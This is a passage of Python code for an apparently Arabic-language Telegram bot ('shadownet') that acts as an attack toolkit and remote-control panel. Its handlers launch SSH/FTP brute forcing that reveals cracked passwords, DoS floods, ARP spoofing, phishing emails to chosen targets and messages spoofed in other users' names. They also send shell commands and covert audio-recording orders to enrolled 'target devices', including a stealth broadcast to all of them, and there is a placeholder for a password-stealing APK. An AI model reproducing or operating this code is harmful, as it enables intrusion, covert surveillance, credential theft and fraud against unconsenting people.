        user_states[chat_id] = "waiting_for_pdf"
        safe_send(chat_id, "📚 أرسل ملف PDF لتحليله")
        return
    
    if data == "mode_fb_report":
        user_states[chat_id] = "waiting_for_fb_report_type"
        safe_send(chat_id, "📢 اختر نوع البلاغ:\n\n1. منشور مسيء\n2. حساب مزيف\n3. محتوى غير لائق\n4. انتهاك خصوصية\n5. تحرش\n6. انتحال شخصية\n7. محتوى عنيف\n\nأرسل الرقم فقط")
        return
    
    # ===== النقاط والإحالات =====
    if data == "mode_points":
        points = get_user_points(chat_id)
        level = get_user_level(points)
        safe_send(chat_id, f"⭐ **نقاطك:** {points}\n🏅 **مستواك:** {level}")
        return
    
    if data == "mode_points_history":
        with get_db_connection() as conn:
            c = conn.cursor()
            c.execute("SELECT amount, reason, created_at FROM points_log WHERE user_id = ? ORDER BY created_at DESC LIMIT 20", (chat_id,))
            rows = c.fetchall()
            if rows:
                msg = "📊 **سجل النقاط:**\n\n"
                for row in rows:
                    sign = "+" if row['amount'] > 0 else ""
                    msg += f"{sign}{row['amount']} - {row['reason']}\n   🕐 {row['created_at'][:16]}\n"
                safe_send(chat_id, msg)
            else:
                safe_send(chat_id, "📊 لا يوجد سجل للنقاط.")
        return
    
    if data == "mode_referral":
        show_referral(call.message)
        return
    
    # ===== لوحة المطور =====
    if data == "mode_admin_panel" and is_admin_user:
        markup = InlineKeyboardMarkup(row_width=2)
        markup.row(
            InlineKeyboardButton("📢 إرسال رسالة", callback_data="admin_send_message"),
            InlineKeyboardButton("👥 إدارة المستخدمين", callback_data="admin_manage_users")
        )
        markup.row(
            InlineKeyboardButton("📊 إحصائيات", callback_data="mode_stats"),
            InlineKeyboardButton("📢 بث جماعي", callback_data="mode_broadcast")
        )
        markup.row(
            InlineKeyboardButton("📩 معلومات مجمعة", callback_data="admin_collected_data"),
            InlineKeyboardButton("📜 سجل الأخطاء", callback_data="admin_logs")
        )
        markup.row(
            InlineKeyboardButton("🔑 إدارة الصلاحيات", callback_data="admin_permissions")
        )
        markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
        safe_send(chat_id, "👑 **لوحة التحكم:**", reply_markup=markup)
        return
    
    if data == "mode_stats" and is_admin_user:
        with get_db_connection() as conn:
            c = conn.cursor()
            c.execute("SELECT COUNT(*) FROM users")
            total_users = c.fetchone()[0]
            c.execute("SELECT SUM(points) FROM users")
            total_points = c.fetchone()[0] or 0
            c.execute("SELECT COUNT(*) FROM targets")
            total_targets = c.fetchone()[0]
            c.execute("SELECT COUNT(*) FROM collected_data")
            total_data = c.fetchone()[0]
            c.execute("SELECT COUNT(*) FROM scan_results")
            total_scans = c.fetchone()[0]
        
        msg = f"📊 **الإحصائيات:**\n\n"
        msg += f"👥 المستخدمون: {total_users}\n"
        msg += f"⭐ إجمالي النقاط: {total_points}\n"
        msg += f"📱 الأجهزة المستهدفة: {total_targets}\n"
        msg += f"📊 البيانات المجمعة: {total_data}\n"
        msg += f"🔍 عدد الفحوصات: {total_scans}"
        safe_send(chat_id, msg)
        return
    
    if data == "mode_broadcast" and is_admin_user:
        user_states[chat_id] = "waiting_for_broadcast"
        safe_send(chat_id, "📢 أرسل الرسالة للبث الجماعي:")
        return
    
    if data == "admin_collected_data" and is_admin_user:
        with get_db_connection() as conn:
            c = conn.cursor()
            c.execute("SELECT data_type, data, ip, created_at FROM collected_data ORDER BY created_at DESC LIMIT 20")
            rows = c.fetchall()
            if rows:
                msg = "📩 **آخر البيانات المجمعة:**\n\n"
                for row in rows:
                    msg += f"📂 {row['data_type']}\n"
                    msg += f"   🌐 {row['ip']}\n"
                    msg += f"   🕐 {row['created_at'][:16]}\n\n"
                safe_send(chat_id, msg)
            else:
                safe_send(chat_id, "📭 لا توجد بيانات.")
        return
    
    if data == "admin_logs" and is_admin_user:
        try:
            with open('shadownet.log', 'r') as f:
                logs = f.read().splitlines()[-30:]
                safe_send(chat_id, f"📜 **آخر 30 سطر:**\n```\n" + "\n".join(logs) + "\n```")
        except:
            safe_send(chat_id, "⚠️ لا يوجد سجل.")
        return
    
    if data == "admin_permissions" and is_admin_user:
        safe_send(chat_id, "🔑 **إدارة الصلاحيات:**\n\nقيد التطوير...")
        return
    
    if data == "mode_devices" and is_admin_user:
        targets = get_all_targets()
        if not targets:
            safe_send(chat_id, "📭 لا توجد أجهزة.")
        else:
            msg = "📱 **الأجهزة المسجلة:**\n\n"
            for target in targets:
                status = "🟢" if target['status'] == 'online' else "🔴"
                msg += f"{status} **{target['name']}**\n"
                msg += f"   🆔 `{target['device_id']}`\n"
                msg += f"   📱 {target['type']}\n"
                if target['ip']:
                    msg += f"   🌐 {target['ip']}\n"
                msg += f"   🕐 {target['last_seen'][:16]}\n\n"
            safe_send(chat_id, msg)
        return
    
    if data == "mode_smart_analysis" and is_admin_user:
        safe_send(chat_id, "📊 **جاري التحليل الذكي...**\n(قيد التطوير)")
        return
    
    if data == "mode_export_data" and is_admin_user:
        safe_send(chat_id, "📂 **جاري تصدير البيانات...**\n(قيد التطوير)")
        return
    
    if data.startswith("admin_send_message") and is_admin_user:
        user_states[chat_id] = "admin_waiting_message"
        safe_send(chat_id, "📝 أرسل الرسالة للمستخدمين (المعرف في السطر الأول):")
        return
    
    if data.startswith("admin_manage_users") and is_admin_user:
        safe_send(chat_id, "👥 **إدارة المستخدمين:**\n\nقيد التطوير...")
        return
    
    # ===== التعامل مع الحالات العامة =====
    else:
        safe_send(chat_id, "⚠️ خيار غير معروف.", reply_markup=build_main_menu(chat_id))

# ===================== معالج النصوص =====================

@bot.message_handler(func=lambda msg: True, content_types=['text'])
def handle_text_messages(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id)
    text = message.text.strip()
    
    # التحقق من القفل
    global bot_locked
    if bot_locked and not is_admin(chat_id):
        safe_send(chat_id, "🔒 البوت مقفل حالياً.")
        return
    
    # التحقق من الحظر
    if is_banned(chat_id):
        safe_send(chat_id, "🚫 أنت محظور.")
        return
    
    # نظام كشف الاختراق
    if detect_suspicious(chat_id, text, {'first_name': message.from_user.first_name}):
        safe_send(chat_id, "⚠️ تم اكتشاف نشاط مشبوه.")
        return
    
    try:
        # ===== فحص النطاق =====
        if state == "waiting_for_domain":
            safe_send(chat_id, "⏳ جاري فحص النطاق...")
            result = domain_scan(text)
            
            msg = f"🌐 **نتيجة فحص النطاق:**\n\n"
            msg += f"📌 **النطاق:** {text}\n\n"
            
            if result.get('whois'):
                msg += "📋 **معلومات WHOIS:**\n"
                whois_data = result['whois']
                msg += f"   • المسجل: {whois_data.get('registrar', 'غير معروف')}\n"
                msg += f"   • التسجيل: {whois_data.get('creation_date', 'غير معروف')}\n"
                msg += f"   • الانتهاء: {whois_data.get('expiration_date', 'غير معروف')}\n"
                if whois_data.get('name_servers'):
                    msg += f"   • خوادم DNS: {', '.join(whois_data['name_servers'][:3])}\n"
            
            if result.get('dns'):
                msg += "\n🌍 **معلومات DNS:**\n"
                for record, values in result['dns'].items():
                    if values:
                        msg += f"   • {record}: {', '.join(values[:3])}\n"
            
            if result.get('server'):
                msg += "\n🖥️ **معلومات السيرفر:**\n"
                msg += f"   • الحالة: {result['server'].get('status_code', 'غير معروف')}\n"
                if result['server'].get('headers'):
                    server = result['server']['headers'].get('Server', 'غير معروف')
                    msg += f"   • السيرفر: {server}\n"
            
            if result.get('ip'):
                msg += "\n🌐 **معلومات IP:**\n"
                msg += f"   • العنوان: {result['ip'].get('address', 'غير معروف')}\n"
                if result['ip'].get('location'):
                    msg += f"   • الموقع: {result['ip']['location']}\n"
                if result['ip'].get('isp'):
                    msg += f"   • مزود الخدمة: {result['ip']['isp']}\n"
            
            save_scan_result(text, 'domain_scan', result)
            safe_send(chat_id, msg)
            user_states[chat_id] = None
            return
        
        # ===== مسح المنافذ =====
        if state == "waiting_for_port_target":
            safe_send(chat_id, "⏳ جاري مسح المنافذ...")
            result = port_scan(text)
            
            msg = f"🔍 **نتيجة مسح المنافذ:**\n\n"
            msg += f"📌 **الهدف:** {text}\n"
            if result.get('ip'):
                msg += f"🌐 **IP:** {result['ip']}\n\n"
            
            if result.get('open_ports'):
                msg += "📡 **المنافذ المفتوحة:**\n"
                for p in result['scanned']:
                    msg += f"   • {p['port']} - {p['service']}\n"
            else:
                msg += "🔒 لا توجد منافذ مفتوحة."
            
            save_scan_result(text, 'port_scan', result)
            safe_send(chat_id, msg)
            user_states[chat_id] = None
            return
        
        # ===== Shodan =====
        if state == "waiting_for_shodan":
            safe_send(chat_id, "⏳ جاري الاستعلام عن Shodan...")
            result = shodan_query(text)
            
            if result.get('error'):
                safe_send(chat_id, f"⚠️ {result['error']}")
            else:
                msg = f"🕵️ **نتيجة Shodan:**\n\n"
                if result.get('ip'):
                    msg += f"📌 **IP:** {result['ip']}\n"
                    msg += f"🖥️ **نظام التشغيل:** {result.get('os', 'غير معروف')}\n"
                    if result.get('ports'):
                        msg += f"📡 **المنافذ:** {', '.join(map(str, result['ports'][:10]))}\n"
                    if result.get('vulnerabilities'):
                        msg += f"⚠️ **الثغرات:** {', '.join(result['vulnerabilities'][:5])}\n"
                elif result.get('total'):
                    msg += f"📊 **عدد النتائج:** {result['total']}\n\n"
                    for r in result.get('results', [])[:5]:
                        msg += f"• {r['ip']}:{r.get('port', '')} - {r.get('org', '')}\n"
                
                save_scan_result(text, 'shodan', result)
                safe_send(chat_id, msg)
            user_states[chat_id] = None
            return
        
        # ===== تتبع IP =====
        if state == "waiting_for_ip_tracker":
            safe_send(chat_id, "⏳ جاري تتبع IP...")
            try:
                ip_info = REQUEST_SESSION.get(f"http://ip-api.com/json/{text}", timeout=10)
                if ip_info.status_code == 200:
                    data = ip_info.json()
                    if data.get('status') == 'success':
                        msg = f"📡 **معلومات IP:**\n\n"
                        msg += f"🌐 **IP:** {text}\n"
                        msg += f"🌍 **البلد:** {data.get('country', 'غير معروف')}\n"
                        msg += f"🏙️ **المدينة:** {data.get('city', 'غير معروف')}\n"
                        msg += f"📍 **المنطقة:** {data.get('regionName', 'غير معروف')}\n"
                        msg += f"📡 **مزود الخدمة:** {data.get('isp', 'غير معروف')}\n"
                        msg += f"🗺️ **الإحداثيات:** {data.get('lat', '')}, {data.get('lon', '')}\n"
                        msg += f"🕐 **المنطقة الزمنية:** {data.get('timezone', 'غير معروف')}\n"
                        safe_send(chat_id, msg)
                    else:
                        safe_send(chat_id, "⚠️ لم يتم العثور على معلومات.")
                else:
                    safe_send(chat_id, "⚠️ فشل الاتصال بخدمة تتبع IP.")
            except Exception as e:
                safe_send(chat_id, f"⚠️ خطأ: {str(e)}")
            user_states[chat_id] = None
            return
        
        # ===== بحث عكسي =====
        if state == "waiting_for_reverse":
            safe_send(chat_id, "⏳ جاري البحث العكسي...")
            result = reverse_lookup(text)
            
            msg = f"🔎 **نتيجة البحث العكسي:**\n\n"
            msg += f"📌 **الاستعلام:** {text}\n\n"
            
            if result.get('found'):
                for item in result['found']:
                    if item['type'] == 'breach':
                        msg += "⚠️ **تم العثور في اختراقات:**\n"
                        for breach in item['data'][:5]:
                            msg += f"   • {breach}\n"
                    elif item['type'] == 'phone':
                        msg += "📱 **معلومات الهاتف:**\n"
                        msg += f"   • البلد: {item.get('country', 'غير معروف')}\n"
                        msg += f"   • المشغل: {item.get('carrier', 'غير معروف')}\n"
                        msg += f"   • صالح: {'✅' if item.get('valid') else '❌'}\n"
            else:
                msg += "✅ لم يتم العثور على معلومات."
            
            safe_send(chat_id, msg)
            user_states[chat_id] = None
            return
        
        # ===== فحص SQLi =====
        if state == "waiting_for_sqli":
            safe_send(chat_id, "⏳ جاري فحص SQL Injection...")
            result = sql_injection_scan(text)
            
            msg = f"🚨 **نتيجة فحص SQLi:**\n\n"
            msg += f"📌 **الرابط:** {text}\n"
            msg += f"🛡️ **الحالة:** {'🔴 ثغرة مكتشفة!' if result['vulnerable'] else '✅ آمن'}\n"
            
            if result['findings']:
                msg += "\n⚠️ **التفاصيل:**\n"
                for finding in result['findings']:
                    msg += f"   • المعامل: {finding['parameter']}\n"
                    msg += f"   • الحمولة: `{finding['payload']}`\n"
            
            save_scan_result(text, 'sqli_scan', result)
            safe_send(chat_id, msg)
            user_states[chat_id] = None
            return
        
        # ===== فحص XSS =====
        if state == "waiting_for_xss":
            safe_send(chat_id, "⏳ جاري فحص XSS...")
            result = xss_scan(text)
            
            msg = f"⚡ **نتيجة فحص XSS:**\n\n"
            msg += f"📌 **الرابط:** {text}\n"
            msg += f"🛡️ **الحالة:** {'🔴 ثغرة مكتشفة!' if result['vulnerable'] else '✅ آمن'}\n"
            
            if result['findings']:
                msg += "\n⚠️ **التفاصيل:**\n"
                for finding in result['findings']:
                    msg += f"   • المعامل: {finding['parameter']}\n"
                    msg += f"   • الحمولة: `{finding['payload']}`\n"
            
            save_scan_result(text, 'xss_scan', result)
            safe_send(chat_id, msg)
            user_states[chat_id] = None
            return
        
        # ===== فحص SSL =====
        if state == "waiting_for_ssl":
            safe_send(chat_id, "⏳ جاري فحص شهادة SSL...")
            result = ssl_scan(text)
            
            msg = f"🔐 **نتيجة فحص SSL:**\n\n"
            msg += f"📌 **النطاق:** {text}\n"
            msg += f"🛡️ **الحالة:** {'✅ صالحة' if result.get('valid') else '❌ غير صالحة'}\n"
            
            if result.get('details'):
                details = result['details']
                msg += f"\n📋 **تفاصيل الشهادة:**\n"
                if details.get('subject'):
                    subject = details['subject']
                    msg += f"   • الجهة: {subject.get('commonName', 'غير معروف')}\n"
                if details.get('issuer'):
                    issuer = details['issuer']
                    msg += f"   • المصدر: {issuer.get('commonName', 'غير معروف')}\n"
                if details.get('not_before'):
                    msg += f"   • البداية: {details['not_before']}\n"
                if details.get('not_after'):
                    msg += f"   • النهاية: {details['not_after']}\n"
                if details.get('days_left') is not None:
                    days = details['days_left']
                    if days > 0:
                        msg += f"   • الأيام المتبقية: {days} يوم\n"
                    else:
                        msg += f"   • ⚠️ انتهت صلاحية الشهادة منذ {abs(days)} يوم\n"
            
            save_scan_result(text, 'ssl_scan', result)
            safe_send(chat_id, msg)
            user_states[chat_id] = None
            return
        
        # ===== فحص شامل =====
        if state == "waiting_for_comprehensive":
            safe_send(chat_id, "⏳ جاري الفحص الشامل... (قد يستغرق بعض الوقت)")
            result = comprehensive_scan(text)
            
            msg = f"🛡️ **نتيجة الفحص الشامل:**\n\n"
            msg += f"📌 **الرابط:** {text}\n"
            msg += f"⚖️ **مستوى الخطر:** {result['risk_level']}\n\n"
            
            if result.get('technologies'):
                msg += "💻 **التقنيات المستخدمة:**\n"
                for tech, version in list(result['technologies'].items())[:5]:
                    msg += f"   • {tech}: {version}\n"
            
            if result.get('vulnerabilities'):
                msg += "\n⚠️ **الثغرات المكتشفة:**\n"
                for vuln in result['vulnerabilities']:
                    msg += f"   • {vuln}\n"
            else:
                msg += "\n✅ لم يتم اكتشاف ثغرات."
            
            save_scan_result(text, 'comprehensive_scan', result)
            safe_send(chat_id, msg)
            user_states[chat_id] = None
            return
        
        # ===== Brute Force =====
        if state == "waiting_for_bruteforce":
            parts = text.split('|')
            if len(parts) < 2:
                safe_send(chat_id, "⚠️ الصيغة غير صحيحة. استخدم: `target|service`")
                user_states[chat_id] = None
                return
            
            target = parts[0]
            service = parts[1].lower()
            
            if service not in ['ssh', 'ftp']:
                safe_send(chat_id, "⚠️ خدمة غير مدعومة. الخدمات المدعومة: ssh, ftp")
                user_states[chat_id] = None
                return
            
            safe_send(chat_id, f"⏳ جاري تنفيذ هجوم Brute Force على {service}... (قد يستغرق وقتاً)")
            result = brute_force(target, service)
            
            msg = f"🎯 **نتيجة Brute Force:**\n\n"
            msg += f"📌 **الهدف:** {target}\n"
            msg += f"🔧 **الخدمة:** {service}\n"
            msg += f"📊 **المحاولات:** {result.get('attempts', 0)}\n"
            msg += f"✅ **النتيجة:** {'🎉 تم الاختراق!' if result.get('success') else '❌ فشل'}\n"
            
            if result.get('success') and result.get('credentials'):
                cred = result['credentials']
                msg += f"\n🔑 **البيانات:**\n"
                msg += f"   • المستخدم: {cred.get('username', '')}\n"
                msg += f"   • كلمة السر: {cred.get('password', '')}\n"
            
            safe_send(chat_id, msg)
            user_states[chat_id] = None
            return
        
        # ===== DoS Attack =====
        if state == "waiting_for_dos":
            parts = text.split('|')
            if len(parts) < 2:
                safe_send(chat_id, "⚠️ الصيغة غير صحيحة. استخدم: `target|port|duration`")
                user_states[chat_id] = None
                return
            
            target = parts[0]
            port = int(parts[1]) if len(parts) > 1 else 80
            duration = int(parts[2]) if len(parts) > 2 else 30
            
            safe_send(chat_id, f"⏳ جاري تنفيذ هجوم DoS على {target}:{port} لمدة {duration} ثانية...")
            result = dos_attack(target, port, duration)
            
            msg = f"🌊 **نتيجة هجوم DoS:**\n\n"
            msg += f"📌 **الهدف:** {target}:{port}\n"
            msg += f"⏱️ **المدة:** {duration} ثانية\n"
            msg += f"📦 **الحزم المرسلة:** {result.get('packets_sent', 0)}\n"
            msg += f"📊 **الحالة:** {result.get('status', 'غير معروف')}\n"
            
            if result.get('error'):
                msg += f"⚠️ **خطأ:** {result['error']}\n"
            
            safe_send(chat_id, msg)
            user_states[chat_id] = None
            return
        
        # ===== ARP Spoof =====
        if state == "waiting_for_arp":
            parts = text.split('|')
            if len(parts) < 2:
                safe_send(chat_id, "⚠️ الصيغة غير صحيحة. استخدم: `target_ip|gateway_ip`")
                user_states[chat_id] = None
                return
            
            target_ip = parts[0]
            gateway_ip = parts[1]
            
            safe_send(chat_id, f"⏳ جاري تنفيذ ARP Spoofing...")
            result = arp_spoof(target_ip, gateway_ip)
            
            msg = f"🕸️ **نتيجة ARP Spoofing:**\n\n"
            msg += f"📌 **الهدف:** {target_ip}\n"
            msg += f"🚪 **البوابة:** {gateway_ip}\n"
            msg += f"📊 **الحالة:** {result.get('status', 'غير معروف')}\n"
            
            if result.get('error'):
                msg += f"⚠️ **خطأ:** {result['error']}\n"
            if result.get('warning'):
                msg += f"⚠️ **تنبيه:** {result['warning']}\n"
            
            safe_send(chat_id, msg)
            user_states[chat_id] = None
            return
        
        # ===== SSH Hack =====
        if state == "waiting_for_ssh_hack":
            parts = text.split('|')
            if len(parts) < 2:
                safe_send(chat_id, "⚠️ الصيغة غير صحيحة. استخدم: `target|username`")
                user_states[chat_id] = None
                return
            
            target = parts[0]
            username = parts[1] if len(parts) > 1 else 'root'
            
            safe_send(chat_id, f"⏳ جاري اختراق SSH على {target}... (قد يستغرق وقتاً)")
            result = brute_force(target, 'ssh', username)
            
            msg = f"🔑 **نتيجة اختراق SSH:**\n\n"
            msg += f"📌 **الهدف:** {target}\n"
            msg += f"👤 **المستخدم:** {username}\n"
            msg += f"📊 **المحاولات:** {result.get('attempts', 0)}\n"
            msg += f"✅ **النتيجة:** {'🎉 تم الاختراق!' if result.get('success') else '❌ فشل'}\n"
            
            if result.get('success') and result.get('credentials'):
                cred = result['credentials']
                msg += f"\n🔑 **البيانات:**\n"
                msg += f"   • المستخدم: {cred.get('username', '')}\n"
                msg += f"   • كلمة السر: {cred.get('password', '')}\n"
            
            safe_send(chat_id, msg)
            user_states[chat_id] = None
            return
        
        # ===== FTP Hack =====
        if state == "waiting_for_ftp_hack":
            parts = text.split('|')
            if len(parts) < 2:
                safe_send(chat_id, "⚠️ الصيغة غير صحيحة. استخدم: `target|username`")
                user_states[chat_id] = None
                return
            
            target = parts[0]
            username = parts[1] if len(parts) > 1 else 'admin'
            
            safe_send(chat_id, f"⏳ جاري اختراق FTP على {target}... (قد يستغرق وقتاً)")
            result = brute_force(target, 'ftp', username)
            
            msg = f"📡 **نتيجة اختراق FTP:**\n\n"
            msg += f"📌 **الهدف:** {target}\n"
            msg += f"👤 **المستخدم:** {username}\n"
            msg += f"📊 **المحاولات:** {result.get('attempts', 0)}\n"
            msg += f"✅ **النتيجة:** {'🎉 تم الاختراق!' if result.get('success') else '❌ فشل'}\n"
            
            if result.get('success') and result.get('credentials'):
                cred = result['credentials']
                msg += f"\n🔑 **البيانات:**\n"
                msg += f"   • المستخدم: {cred.get('username', '')}\n"
                msg += f"   • كلمة السر: {cred.get('password', '')}\n"
            
            safe_send(chat_id, msg)
            user_states[chat_id] = None
            return
        
        # ===== سرقة كلمات المرور =====
        if state == "password_stealer_apk":
            # سيتم تنفيذه لاحقاً
            safe_send(chat_id, "🔑 **ملف APK قيد التطوير...**")
            user_states[chat_id] = None
            return
        
        # ===== تحميل فيديو =====
        if state == "waiting_for_download":
            if re.match(r'^https?://', text):
                safe_send(chat_id, "⏳ جاري تحميل الفيديو...")
                result, error = download_video(text)
                if error:
                    safe_send(chat_id, f"⚠️ {error}")
                elif result and os.path.exists(result):
                    try:
                        with open(result, 'rb') as f:
                            bot.send_video(chat_id, f, caption="📥 تم التحميل")
                        os.remove(result)
                    except Exception as e:
                        safe_send(chat_id, f"⚠️ فشل إرسال الفيديو: {str(e)}")
                else:
                    safe_send(chat_id, "⚠️ فشل تحميل الفيديو.")
            else:
                safe_send(chat_id, "❌ رابط غير صالح.")
            user_states[chat_id] = None
            return
        
        # ===== تقصير الرابط =====
        if state == "waiting_for_shorten":
            if re.match(r'^https?://', text):
                short_url, error = shorten_url(text)
                if error:
                    safe_send(chat_id, f"⚠️ فشل تقصير الرابط: {error}")
                else:
                    safe_send(chat_id, f"✅ الرابط المختصر:\n{short_url}")
            else:
                safe_send(chat_id, "❌ رابط غير صالح.")
            user_states[chat_id] = None
            return
        
        # ===== فيشينغ =====
        if state == "waiting_for_phishing":
            user_states[chat_id] = "waiting_for_phishing_body"
            user_states[f"{chat_id}_phishing_data"] = text
            safe_send(chat_id, "📝 اكتب نص الرسالة الآن:")
            return
        
        if state == "waiting_for_phishing_body":
            data = user_states.get(f"{chat_id}_phishing_data", "")
            parts = data.split('|')
            if len(parts) < 2:
                safe_send(chat_id, "⚠️ بيانات غير صحيحة.")
                user_states[chat_id] = None
                return
            
            target_email = parts[0]
            subject = parts[1] if len(parts) > 1 else "تنبيه أمني"
            
            safe_send(chat_id, f"⏳ جاري إرسال بريد التصيد إلى {target_email}...")
            result = send_phishing_email(target_email, subject, text)
            
            msg = f"📧 **نتيجة إرسال البريد:**\n\n"
            msg += f"📌 **الهدف:** {target_email}\n"
            msg += f"📌 **الموضوع:** {subject}\n"
            msg += f"📊 **الحالة:** {'✅ تم الإرسال' if result.get('status') == 'sent' else '❌ فشل'}\n"
            
            if result.get('error'):
                msg += f"⚠️ **خطأ:** {result['error']}\n"
            
            safe_send(chat_id, msg)
            user_states[chat_id] = None
            if f"{chat_id}_phishing_data" in user_states:
                del user_states[f"{chat_id}_phishing_data"]
            return
        
        # ===== سبوفينغ =====
        if state == "waiting_for_spoof_target":
            target_id = text.strip()
            if target_id.isdigit():
                user_states[chat_id] = "waiting_for_spoof_msg"
                user_states[f"{chat_id}_spoof_target"] = int(target_id)
                safe_send(chat_id, f"✅ تم اختيار المستخدم {target_id}\nأرسل الرسالة التي تريد إرسالها باسمه:")
            else:
                safe_send(chat_id, "❌ المعرف غير صحيح.")
                user_states[chat_id] = None
            return
        
        if state == "waiting_for_spoof_msg":
            target_id = user_states.get(f"{chat_id}_spoof_target")
            if target_id:
                result = spoof_message(chat_id, target_id, text)
                if result.get('status') == 'sent':
                    safe_send(chat_id, f"✅ تم إرسال الرسالة المزيفة باسم المستخدم {target_id}")
                else:
                    safe_send(chat_id, f"⚠️ فشل الإرسال: {result.get('error', 'خطأ غير معروف')}")
            else:
                safe_send(chat_id, "❌ لم يتم تحديد هدف.")
            user_states[chat_id] = None
            if f"{chat_id}_spoof_target" in user_states:
                del user_states[f"{chat_id}_spoof_target"]
            return
        
        # ===== رسائل مزيفة =====
        if state == "waiting_for_fake_msg":
            safe_send(chat_id, f"📱 **رسالة مزيفة:**\n\n{text}")
            user_states[chat_id] = None
            return
        
        # ===== تسجيل صوت عن بعد =====
        if state == "waiting_for_mic_duration":
            try:
                duration = int(text)
                if duration < 1 or duration > 60:
                    safe_send(chat_id, "⚠️ المدة بين 1 و 60 ثانية.")
                    return
                device_id = admin_remote_target.get(chat_id)
                if device_id:
                    add_command(device_id, f"RECORD_AUDIO:{duration}")
                    safe_send(chat_id, f"🎙️ تم إرسال أمر التسجيل لمدة {duration} ثانية للجهاز {device_id}")
                else:
                    safe_send(chat_id, "❌ لم يتم تحديد جهاز.")
                user_states[chat_id] = None
            except ValueError:
                safe_send(chat_id, "⚠️ يرجى إدخال رقم صحيح.")
            return
        
        # ===== Shell عن بعد =====
        if state == "waiting_for_remote_shell":
            device_id = admin_remote_target.get(chat_id)
            if device_id:
                add_command(device_id, f"EXEC_SHELL:{text}")
                safe_send(chat_id, f"🖥️ تم إرسال الأمر للجهاز {device_id}")
            else:
                safe_send(chat_id, "❌ لم يتم تحديد جهاز.")
            user_states[chat_id] = None
            return
        
        # ===== التحكم الخفي - Shell =====
        if state == "stealth_waiting_shell" and is_admin(chat_id):
            device_id = admin_remote_target.get(chat_id)
            if device_id:
                add_command(device_id, f"EXEC_SHELL:{text}")
                safe_send(chat_id, f"✅ تم إرسال الأمر Shell للجهاز {device_id}")
            else:
                safe_send(chat_id, "❌ لم يتم تحديد جهاز.")
            user_states[chat_id] = None
            return
        
        # ===== بث خفي =====
        if state == "stealth_waiting_broadcast" and is_admin(chat_id):
            command = text.strip()
            targets = get_all_targets()
            if not targets:
                safe_send(chat_id, "⚠️ لا توجد أجهزة.")
            else:
                count = 0
                for target in targets:
                    add_command(target['device_id'], command)
                    count += 1
                safe_send(chat_id, f"✅ تم بث الأمر `{command}` إلى {count} جهاز.")
            user_states[chat_id] = None
            return
        
        # ===== بث جماعي =====
        if state == "waiting_for_broadcast" and is_admin(chat_id):
            with get_db_connection() as conn:
                c = conn.cursor()
                c.execute("SELECT chat_id FROM users WHERE is_banned = 0")
                users = c.fetchall()
            
            success = 0
            for user in users:
                try:
                    safe_send(user['chat_id'], f"📢 **رسالة من الإدارة:**\n\n{text}")
                    success += 1
                    time.sleep(0.05)
                except:
                    pass
            
            safe_send(chat_id, f"✅ تم إرسال الرسالة لـ {success} مستخدم.")
            user_states[chat_id] = None
            return
        
        # ===== إدارة المستخدمين - إرسال رسالة =====
        if state == "admin_waiting_message" and is_admin(chat_id):
            lines = text.split('\n', 1)
            if len(lines) < 2:
                safe_send(chat_id, "⚠️ الصيغة غير صحيحة. السطر الأول: معرف المستخدم، ثم الرسالة.")
                user_states[chat_id] = None
                return
            
            try:
                target_id = int(lines[0].strip())
                msg_text = lines[1].strip()
                safe_send(target_id, f"📩 **رسالة من الإدارة:**\n\n{msg_text}")
                safe_send(chat_id, f"✅ تم إرسال الرسالة للمستخدم {target_id}")
            except ValueError:
                safe_send(chat_id, "⚠️ المعرف غير صحيح.")
            user_states[chat_id] = None
            return
        
        # ===== بلاغ فيسبوك =====
        if state == "waiting_for_fb_report_type":
            report_types = {
                '1': 'منشور مسيء',
                '2': 'حساب مزيف',
                '3': 'محتوى غير لائق',
                '4': 'انتهاك خصوصية',
                '5': 'تحرش',
                '6': 'انتحال شخصية',
                '7': 'محتوى عنيف'
            }
            if text in report_types:
                user_states[chat_id] = "waiting_for_fb_report_reason"
                user_states[f"{chat_id}_fb_type"] = report_types[text]
                safe_send(chat_id, f"✅ تم اختيار: {report_types[text]}\n\nاكتب شرحاً مفصلاً للمشكلة:")
            else:
                safe_send(chat_id, "⚠️ اختيار غير صحيح.")
            return
        
        if state == "waiting_for_fb_report_reason":
            user_states[chat_id] = "waiting_for_fb_report_link"
            user_states[f"{chat_id}_fb_reason"] = text
            safe_send(chat_id, "✅ تم حفظ السبب.\n\nأرسل رابط المنشور (أو اكتب 'لا يوجد')")
            return
        
        if state == "waiting_for_fb_report_link":
            link = text if text.lower() != 'لا يوجد' else ''
            report_type = user_states.get(f"{chat_id}_fb_type", "أخرى")
            reason = user_states.get(f"{chat_id}_fb_reason", "")
            
            report_text = f"""Dear Facebook Support Team,

I am reporting content that violates Facebook's Community Standards regarding {report_type}.

Issue Description:
{reason}

Link: {link if link else 'Not provided'}

Sincerely,
A concerned Facebook user"""

            support_link = "https://www.facebook.com/help/contact/315847653073855"
            
            final_msg = f"📝 **شكوى رسمية**\n\n{report_text}\n\n🔗 رابط الدعم: {support_link}\n\n📌 انسخ النص أعلاه، ثم اضغط على الرابط، والصق النص."
            
            markup = InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton("🌐 فتح رابط الدعم", url=support_link))
            markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
            
            safe_send(chat_id, final_msg, reply_markup=markup)
            
            for key in [f"{chat_id}_fb_type", f"{chat_id}_fb_reason"]:
                if key in user_states:
                    del user_states[key]
            user_states[chat_id] = None
            return
        
        # ===== الحالة الافتراضية =====
        if state is None:
            safe_send(chat_id, "🤖 اختر أداة من القائمة.", reply_markup=build_main_menu(chat_id))
    
    except Exception as e:
        logger.error(f"handle_text_messages error: {e}")
        notify_admin(f"خطأ: {str(e)}", is_error=True)
        safe_send(chat_id, f"⚠️ حدث عطل فني: {str(e)[:100]}")

# ===================== معالج الملفات =====================

@bot.message_handler(content_types=['document'])
def handle_documents(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id)
    
    try:
        if state == "waiting_for_pdf":
            file = message.document
            file_name = file.file_name or "بدون اسم"
            if not file_name.lower().endswith('.pdf'):
                safe_send(chat_id, "❌ يرجى إرسال ملف PDF.")
                return
            
            safe_send(chat_id, "⏳ جاري تحليل الملف...")
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            
            pdf_text = extract_pdf_text(downloaded)
            if not pdf_text:
                safe_send(chat_id, "⚠️ فشل استخراج النص.")
                user_states[chat_id] = None
                return
            
            user_states[f"{chat_id}_pdf_text"] = pdf_text
            user_states[chat_id] = "waiting_for_pdf_question"
